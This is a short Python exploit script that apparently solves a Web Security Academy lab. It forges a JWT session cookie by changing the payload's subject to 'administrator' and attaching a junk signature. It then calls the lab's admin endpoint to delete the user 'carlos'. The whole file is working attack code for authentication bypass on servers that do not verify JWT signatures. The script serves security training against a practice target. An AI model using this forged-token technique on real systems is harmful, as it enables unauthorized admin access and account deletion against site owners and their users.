import requests
from bs4 import BeautifulSoup

# requirements.txt
# pip3 install bs4
# pip3 install lxml

def exploit(url,url_delete):
    # eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0== = {"sub":"administrator"}
    cookie = {"Cookie":"session=eyJraWQiOiI5ZjQwZGE2NS05M2U3LTQzMDctOWJlNC1jNGYxMzk5NTg3YzgiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0==.test"}
    try:
        r = requests.get(url+url_delete, headers=cookie)
        print(r.status_code)
    except Exception as e:
        print(f"[ERRRO] {e}")

if __name__ == '__main__':
    url = "https://0a1a0085045cf17381804337002c005f.web-security-academy.net"
    url_delete = "/admin/delete?username=carlos"
    exploit(url,url_delete)

